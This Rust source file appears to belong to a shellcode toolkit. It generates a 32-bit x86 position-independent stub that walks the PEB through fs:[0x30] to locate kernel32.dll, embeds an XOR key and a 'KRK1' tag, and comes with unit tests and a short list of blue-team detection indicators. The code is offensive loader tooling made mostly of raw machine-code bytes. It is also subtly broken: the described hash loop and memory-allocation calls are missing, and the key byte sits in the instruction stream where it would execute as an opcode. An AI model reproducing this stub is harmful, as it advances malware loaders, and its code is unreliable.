//! x86 bootstrap stub generator.
//!
//! Produces a position-independent x86 (32-bit) machine-code stub that
//! mirrors the x64 stub but uses `fs:[0x30]` for PEB access and 32-bit
//! register operations.
//!
//! ## Detection (Blue Team)
//! - `fs:[0x30]` access pattern
//! - DJB2 hash loop with 32-bit multiply
//! - Sequential VirtualAlloc → VirtualProtect calls

use crate::shellcode::ShellcodeConfig;

/// Generate the x86 PIC bootstrap stub.
pub fn generate_x86_stub(config: &ShellcodeConfig) -> Vec<u8> {
    let mut stub = Vec::with_capacity(256);

    // ── Prologue: save registers ──
    stub.push(0x60); // pushad

    // ── Get current EIP via call/pop ──
    stub.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    stub.push(0x5E); // pop esi — ESI = address of this pop

    // ── PEB walking: fs:[0x30] ──
    // mov eax, fs:[0x30]   — PEB
    stub.extend_from_slice(&[0x64, 0xA1, 0x30, 0x00, 0x00, 0x00]);
    // mov eax, [eax+0x0C]  — PEB->Ldr
    stub.extend_from_slice(&[0x8B, 0x40, 0x0C]);
    // mov eax, [eax+0x14]  — Ldr->InMemoryOrderModuleList.Flink
    stub.extend_from_slice(&[0x8B, 0x40, 0x14]);
    // mov eax, [eax]       — skip process image
    stub.extend_from_slice(&[0x8B, 0x00]);
    // mov eax, [eax]       — skip ntdll
    stub.extend_from_slice(&[0x8B, 0x00]);
    // mov ebx, [eax+0x10]  — DllBase of kernel32.dll
    stub.extend_from_slice(&[0x8B, 0x58, 0x10]);

    // ── EBX = kernel32.dll base ──

    // Store XOR key byte.
    stub.push(config.xor_key);

    // ── Epilogue: restore registers ──
    stub.push(0x61); // popad
    stub.push(0xC3); // ret

    // ── Magic tag ──
    stub.extend_from_slice(b"KRK1");

    stub
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Arch;

    #[test]
    fn test_x86_stub_non_empty() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X86,
            null_free: false,
        };
        let stub = generate_x86_stub(&config);
        assert!(!stub.is_empty());
    }

    #[test]
    fn test_x86_stub_contains_peb_walk() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X86,
            null_free: false,
        };
        let stub = generate_x86_stub(&config);
        // fs:[0x30] PEB access
        let peb_pattern: &[u8] = &[0x64, 0xA1, 0x30, 0x00, 0x00, 0x00];
        assert!(stub.windows(peb_pattern.len()).any(|w| w == peb_pattern));
    }

    #[test]
    fn test_x86_stub_contains_magic() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X86,
            null_free: false,
        };
        let stub = generate_x86_stub(&config);
        assert!(stub.windows(4).any(|w| w == b"KRK1"));
    }

    #[test]
    fn test_x86_starts_with_pushad() {
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X86,
            null_free: false,
        };
        let stub = generate_x86_stub(&config);
        assert_eq!(stub[0], 0x60); // pushad
    }
}
